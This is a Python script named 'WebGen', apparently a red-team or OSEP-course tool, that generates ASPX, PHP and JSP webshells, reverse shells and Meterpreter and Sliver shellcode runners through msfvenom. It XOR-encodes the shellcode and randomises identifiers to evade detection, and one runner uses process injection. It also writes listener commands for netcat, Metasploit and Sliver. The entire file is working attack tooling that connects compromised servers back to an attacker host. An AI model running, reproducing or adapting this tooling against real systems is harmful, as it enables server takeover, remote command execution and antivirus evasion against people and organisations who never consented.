#!/usr/bin/env python3
import argparse
import sys
import os
import shutil
import subprocess
import socket
import re
import base64
import random
import string
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()

BANNER = r"""
[bold yellow]  ██╗    ██╗███████╗██████╗  ██████╗ ███████╗███╗   ██╗[/bold yellow]
[bold yellow]  ██║    ██║██╔════╝██╔══██╗██╔════╝ ██╔════╝████╗  ██║[/bold yellow]
[bold yellow]  ██║ █╗ ██║█████╗  ██████╔╝██║  ███╗█████╗  ██╔██╗ ██║[/bold yellow]
[bold yellow]  ██║███╗██║██╔══╝  ██╔══██╗██║   ██║██╔══╝  ██║╚██╗██║[/bold yellow]
[bold yellow]  ╚███╔███╔╝███████╗██████╔╝╚██████╔╝███████╗██║ ╚████║[/bold yellow]
[bold yellow]   ╚══╝╚══╝ ╚══════╝╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝[/bold yellow]
[bold cyan]                         --- WEB ARSENAL GENERATOR ---[/bold cyan]
[bold black]                   Developed by: q3alique | Version: 2.4[/bold black]
"""

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATE_DIR = os.path.join(SCRIPT_DIR, "templates")
OUTPUT_BASE = os.path.join(SCRIPT_DIR, "output")

def random_string(length=8):
    return "".join(random.choices(string.ascii_letters, k=length))

def xor_data(data, key):
    return bytes([b ^ key for b in data])

def get_ip(interface):
    try:
        socket.inet_aton(interface)
        return interface
    except socket.error:
        try:
            output = subprocess.check_output(f"ip addr show {interface}", shell=True).decode()
            match = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", output)
            if match: return match.group(1)
        except Exception: return None
    return None

def generate_payload(payload, lhost, lport, format="raw"):
    cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} EXITFUNC=thread -f {format}"
    console.print(f"[bold blue][*][/bold blue] Generating {payload} on port {lport}...")
    try:
        process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        if process.returncode != 0: return None
        return stdout
    except Exception: return None

def randomize_template(content, symbols):
    for placeholder, replacement in symbols.items():
        content = content.replace(placeholder, replacement)
    return content

def get_aspx_symbols(sc_hex, key):
    return {
        "#SHELLCODE#": sc_hex, "#KEY#": hex(key), 
        "#DA#": random_string(), "#DT#": random_string(), "#VA#": random_string(), 
        "#A#": random_string(), "#S#": random_string(), "#AT#": random_string(), "#P#": random_string(), 
        "#PH#": random_string(), "#Q#": random_string(), "#C#": random_string(), "#DI#": random_string(), "#F#": random_string(), 
        "#B#": random_string(), "#H#": random_string(), "#PA1#": random_string(), "#PA2#": random_string(), 
        "#T#": random_string(), "#ADDR#": random_string(), "#H2#": random_string(), 
        "#LN#": random_string(), "#M#": random_string(), "#PN#": random_string(),
        "#ESL#": random_string(), "#O#": random_string(), "#L#": random_string(), "#F#": random_string()
    }

def get_sliver_symbols(sc_hex, key):
    return {
        "#SHELLCODE#": sc_hex, "#KEY#": hex(key),
        "#CP_DEL#": random_string(), "#VA_DEL#": random_string(), "#WP_DEL#": random_string(), 
        "#QA_DEL#": random_string(), "#RT_DEL#": random_string(),
        "#SI_STRUCT#": random_string(), "#PI_STRUCT#": random_string(),
        "#N_PARAM#": random_string(), "#C_PARAM#": random_string(), "#PA_PARAM#": random_string(),
        "#TA_PARAM#": random_string(), "#I_PARAM#": random_string(), "#F_PARAM#": random_string(),
        "#E_PARAM#": random_string(), "#D_PARAM#": random_string(), "#S1_PARAM#": random_string(),
        "#P1_PARAM#": random_string(), "#H_PARAM#": random_string(), "#A_PARAM#": random_string(),
        "#S_PARAM#": random_string(), "#AT_PARAM#": random_string(), "#P_PARAM#": random_string(),
        "#B_PARAM#": random_string(), "#BU_PARAM#": random_string(), "#BR_PARAM#": random_string(),
        "#T_PARAM#": random_string(), "#D_PARAM#": random_string(),
        "#CB_FLD#": random_string(), "#R_FLD#": random_string(), "#D_FLD#": random_string(),
        "#T_FLD#": random_string(), "#X_FLD#": random_string(), "#Y_FLD#": random_string(),
        "#XS_FLD#": random_string(), "#YS_FLD#": random_string(), "#XCA_FLD#": random_string(),
        "#YCA_FLD#": random_string(), "#F_FLD#": random_string(), "#W_FLD#": random_string(),
        "#CB2_FLD#": random_string(), "#RE_FLD#": random_string(), "#H1_FLD#": random_string(),
        "#H2_FLD#": random_string(), "#H3_FLD#": random_string(), "#PH_FLD#": random_string(),
        "#TH_FLD#": random_string(), "#PID_FLD#": random_string(), "#TID_FLD#": random_string(),
        "#SHELLCODE_VAR#": random_string(), "#KERNEL32_HANDLE#": random_string(),
        "#CREATE_PROCESS_FUNC#": random_string(), "#VIRTUAL_ALLOC_EX_FUNC#": random_string(),
        "#WRITE_PROCESS_MEM_FUNC#": random_string(), "#QUEUE_USER_APC_FUNC#": random_string(),
        "#RESUME_THREAD_FUNC#": random_string(), "#STARTUP_INFO_VAR#": random_string(),
        "#PROCESS_INFO_VAR#": random_string(), "#SUCCESS_VAR#": random_string(),
        "#REMOTE_ADDR_VAR#": random_string(), "#BYTES_WRITTEN_VAR#": random_string(),
        "#LIB_NAME_PARAM#": random_string(), "#MOD_HANDLE_PARAM#": random_string(),
        "#PROC_NAME_PARAM#": random_string()
    }

def main():
    console.print(BANNER)
    parser = argparse.ArgumentParser(description="WebGen - OSEP Web Payload Generator", add_help=False)
    parser.add_argument("--lhost", help="LHOST IP or Interface (e.g., tun0)")
    parser.add_argument("--callback-host", help="Callback IP for reverse shells (default: lhost)")
    parser.add_argument("--key", type=int, help="XOR Key (default: random)")
    parser.add_argument("--msf-port", type=int, default=2223, help="MSF Port (default: 2223)")
    parser.add_argument("--sliver-port", type=int, default=4443, help="Sliver Port (default: 4443)")
    parser.add_argument("-h", "--help", action="store_true", help="Show help")
    
    try:
        args = parser.parse_args()
    except SystemExit: sys.exit(1)

    if args.help or not args.lhost:
        table = Table(show_header=False, box=None, padding=(0, 2))
        table.add_column("Option", style="bold yellow", width=35)
        table.add_column("Description", style="white")
        table.add_row("\n[bold cyan]Configuration[/bold cyan]", "")
        table.add_row("--lhost [green]LHOST[/green]", "IP address or interface (tun0, eth0)")
        table.add_row("--callback-host [green]IP[/green]", "Callback IP for reverse shells (default: lhost)")
        table.add_row("--key [green]INT[/green]", "XOR encryption key (default: random)")
        table.add_row("--msf-port [green]PORT[/green]", "MSF Port (default: 2223)")
        table.add_row("--sliver-port [green]PORT[/green]", "Sliver Port (default: 4443)")
        table.add_row("\n[bold cyan]General[/bold cyan]", "")
        table.add_row("-h, --help", "Show help")
        console.print(table); sys.exit(0)

    lhost = get_ip(args.lhost)
    if not lhost: console.print(f"[bold red][-] Error resolving IP for: {args.lhost}[/bold red]"); sys.exit(1)
    
    cb_host = args.callback_host if args.callback_host else lhost

    key = args.key if args.key is not None else random.randint(1, 255)
    console.print(f"[bold blue][*][/bold blue] Using XOR Key: [bold cyan]{hex(key)}[/bold cyan]")
    console.print(f"[bold blue][*][/bold blue] Target Host: [bold cyan]{lhost}[/bold cyan]")
    console.print(f"[bold blue][*][/bold blue] Callback Host: [bold cyan]{cb_host}[/bold cyan]")

    folder_name = lhost.replace(".", "-")
    target_dir = os.path.join(OUTPUT_BASE, folder_name)
    if not os.path.exists(target_dir): os.makedirs(target_dir)

    payloads_info = []
    secret = random_string(12)

    # --- 1. ASPX SUITE ---
    console.print("[bold yellow]Generating ASPX Suite...[/bold yellow]")
    # 1.1 Webshell
    with open(os.path.join(TEMPLATE_DIR, "aspx", "webshell.aspx"), "r") as f: content = f.read()
    symbols = {"#SECRET#": secret, "#PW#": random_string(), "#FD#": random_string(), "#CMD#": random_string(), "#P#": random_string(), "#D#": random_string(), "#C#": random_string(), "#PR#": random_string()}
    content = randomize_template(content, symbols)
    filename = "web_" + random_string(4) + ".aspx"
    with open(os.path.join(target_dir, filename), "w") as f: f.write(content)
    payloads_info.append({"name": filename, "type": "ASPX Webshell", "port": "N/A", "details": f"Pass: {secret}"})

    # 1.2 Classic Revshell
    with open(os.path.join(TEMPLATE_DIR, "aspx", "revshell.aspx"), "r") as f: content = f.read()
    symbols = {"#LHOST#": cb_host, "#LPORT#": str(args.msf_port), "#IP#": random_string(), "#PORT#": random_string(), "#C#": random_string(), "#S#": random_string(), "#R#": random_string(), "#W#": random_string(), "#P#": random_string(), "#IN#": random_string()}
    content = randomize_template(content, symbols)
    filename = "rev_" + random_string(4) + ".aspx"
    with open(os.path.join(target_dir, filename), "w") as f: f.write(content)
    payloads_info.append({"name": filename, "type": "ASPX Revshell (TCP Client)", "port": args.msf_port, "details": "Catch with nc"})

    # 1.3 Meterpreter (Shellcode)
    msf_sc = generate_payload("windows/x64/meterpreter_reverse_tcp", cb_host, args.msf_port)
    if msf_sc:
        xor_sc = xor_data(msf_sc, key)
        sc_hex = ", ".join([f"0x{b:02X}" for b in xor_sc])
        with open(os.path.join(TEMPLATE_DIR, "aspx", "runner_delegate.aspx"), "r") as f: content = f.read()
        symbols = get_aspx_symbols(sc_hex, key)
        content = randomize_template(content, symbols)
        filename = "msf_" + random_string(4) + ".aspx"
        with open(os.path.join(target_dir, filename), "w") as f: f.write(content)
        payloads_info.append({"name": filename, "type": "ASPX MSF Runner (XOR SC)", "port": args.msf_port, "details": "Catch with msf (stageless)"})

    # 1.4 Sliver (Shellcode)
    sliver_sc = generate_payload("windows/x64/meterpreter/reverse_tcp", cb_host, args.sliver_port)
    if sliver_sc:
        xor_sc = xor_data(sliver_sc, key)
        sc_hex = ", ".join([f"0x{b:02X}" for b in xor_sc])
        with open(os.path.join(TEMPLATE_DIR, "aspx", "runner_sliver.aspx"), "r") as f: content = f.read()
        symbols = get_sliver_symbols(sc_hex, key)
        content = randomize_template(content, symbols)
        filename = "sli_" + random_string(4) + ".aspx"
        with open(os.path.join(target_dir, filename), "w") as f: f.write(content)
        payloads_info.append({"name": filename, "type": "ASPX Sliver Runner (Injection)", "port": args.sliver_port, "details": "Catch with sliver (staged)"})


    # --- 2. PHP SUITE ---
    console.print("[bold yellow]Generating PHP Suite...[/bold yellow]")
    # 2.1 Webshell
    with open(os.path.join(TEMPLATE_DIR, "php", "webshell.php"), "r") as f: content = f.read()
    symbols = {"#SECRET#": secret, "#P#": random_string(), "#CMD#": random_string(), "#C#": random_string(), "#O#": random_string(), "#L#": random_string()}
    content = randomize_template(content, symbols)
    filename = "web_" + random_string(4) + ".php"
    with open(os.path.join(target_dir, filename), "w") as f: f.write(content)
    payloads_info.append({"name": filename, "type": "PHP Webshell", "port": "N/A", "details": f"Pass: {secret}"})

    # 2.2 Classic Revshell
    with open(os.path.join(TEMPLATE_DIR, "php", "revshell.php"), "r") as f: content = f.read()
    symbols = {"#LHOST#": cb_host, "#LPORT#": str(args.msf_port), "#IP#": random_string(), "#PORT#": random_string(), "#S#": random_string(), "#D#": random_string(), "#P#": random_string(), "#PI#": random_string(), "#R#": random_string(), "#W#": random_string(), "#E#": random_string(), "#N#": random_string(), "#I#": random_string()}
    content = randomize_template(content, symbols)
    filename = "rev_" + random_string(4) + ".php"
    with open(os.path.join(target_dir, filename), "w") as f: f.write(content)
    payloads_info.append({"name": filename, "type": "PHP Revshell", "port": args.msf_port, "details": "Catch with nc"})

    # 2.3 Meterpreter (Pure PHP)
    php_msf = generate_payload("php/meterpreter/reverse_tcp", cb_host, args.msf_port, format="raw")
    if php_msf:
        filename = "msf_" + random_string(4) + ".php"
        with open(os.path.join(target_dir, filename), "wb") as f: f.write(b"<?php " + php_msf)
        payloads_info.append({"name": filename, "type": "PHP MSF (Pure)", "port": args.msf_port, "details": "Catch with msf"})

    # 2.4 Sliver (MSF-compatible PHP)
    php_sli = generate_payload("php/reverse_php", cb_host, args.sliver_port, format="raw")
    if php_sli:
        filename = "sli_" + random_string(4) + ".php"
        with open(os.path.join(target_dir, filename), "wb") as f: f.write(b"<?php " + php_sli)
        payloads_info.append({"name": filename, "type": "PHP Sliver (Stager)", "port": args.sliver_port, "details": "Catch with sliver"})


    # --- 3. JSP SUITE ---
    console.print("[bold yellow]Generating JSP Suite...[/bold yellow]")
    # 3.1 Webshell
    with open(os.path.join(TEMPLATE_DIR, "jsp", "webshell.jsp"), "r") as f: content = f.read()
    symbols = {"#SECRET#": secret, "#P#": random_string(), "#CMD#": random_string(), "#C#": random_string(), "#PW#": random_string(), "#PR#": random_string(), "#I#": random_string(), "#R#": random_string(), "#L#": random_string()}
    content = randomize_template(content, symbols)
    filename = "web_" + random_string(4) + ".jsp"
    with open(os.path.join(target_dir, filename), "w") as f: f.write(content)
    payloads_info.append({"name": filename, "type": "JSP Webshell", "port": "N/A", "details": f"Pass: {secret}"})

    # 3.2 Classic Revshell
    with open(os.path.join(TEMPLATE_DIR, "jsp", "revshell.jsp"), "r") as f: content = f.read()
    symbols = {"#LHOST#": cb_host, "#LPORT#": str(args.msf_port), "#IP#": random_string(), "#PORT#": random_string(), "#S#": random_string(), "#P#": random_string(), "#PI#": random_string(), "#PO#": random_string(), "#SI#": random_string(), "#SO#": random_string(), "#B#": random_string(), "#L#": random_string()}
    content = randomize_template(content, symbols)
    filename = "rev_" + random_string(4) + ".jsp"
    with open(os.path.join(target_dir, filename), "w") as f: f.write(content)
    payloads_info.append({"name": filename, "type": "JSP Revshell", "port": args.msf_port})

    # 3.3 Meterpreter (Pure Java JSP)
    jsp_msf = generate_payload("java/jsp_shell_reverse_tcp", cb_host, args.msf_port, format="raw")
    if jsp_msf:
        filename = "msf_" + random_string(4) + ".jsp"
        with open(os.path.join(target_dir, filename), "wb") as f: f.write(jsp_msf)
        payloads_info.append({"name": filename, "type": "JSP MSF (Pure)", "port": args.msf_port, "details": "Catch with msf"})


    # --- 4. SUMMARY & README ---
    readme = f"# 🕸️ Web Arsenal - {lhost}\n\n"
    readme += f"**XOR Key Used**: `{hex(key)}`\n"
    readme += f"**Callback IP**: `{cb_host}`\n\n"
    readme += "## 📂 Generated Payloads\n\n| Filename | Type | Port | Details |\n|---|---|---|---|\n"
    for p in payloads_info:
        readme += f"| `{p['name']}` | {p['type']} | {p['port']} | {p.get('details', 'N/A')} |\n"
    
    readme += f"\n## 🎧 Listener Commands\n\n"
    readme += f"### 1. Netcat (Classic Revshells)\n"
    readme += f"```bash\nnc -nvlp {args.msf_port}\n```\n\n"
    readme += f"### 2. Metasploit (ASPX Shellcode Runner)\n"
    readme += f"```bash\nmsfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {cb_host}; set LPORT {args.msf_port}; run -j'\n```\n\n"
    readme += f"### 3. Metasploit (PHP Pure Meterpreter)\n"
    readme += f"```bash\nmsfconsole -q -x 'use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST {cb_host}; set LPORT {args.msf_port}; run -j'\n```\n\n"
    readme += f"### 4. Metasploit (JSP MSF)\n"
    readme += f"```bash\nmsfconsole -q -x 'use exploit/multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp; set LHOST {cb_host}; set LPORT {args.msf_port}; run -j'\n```\n\n"
    readme += f"### 5. Sliver (ASPX & PHP/JSP Stagers)\n"
    readme += f"```bash\n# In sliver console:\n# stage-listener --url tcp://{cb_host}:{args.sliver_port} --profile sliver_x64\n```\n"

    with open(os.path.join(target_dir, "README.md"), "w") as f: f.write(readme)

    console.print(f"\n[bold green][+][/bold green] All payloads generated in: [cyan]{target_dir}[/cyan]")
    table = Table(title="Web Arsenal Assets")
    table.add_column("Filename", style="cyan")
    table.add_column("Type", style="magenta")
    table.add_column("Port", style="yellow")
    table.add_column("Details", style="white")
    for p in payloads_info: table.add_row(p['name'], p['type'], str(p['port']), p.get('details', ''))
    console.print(table)

if __name__ == "__main__": main()
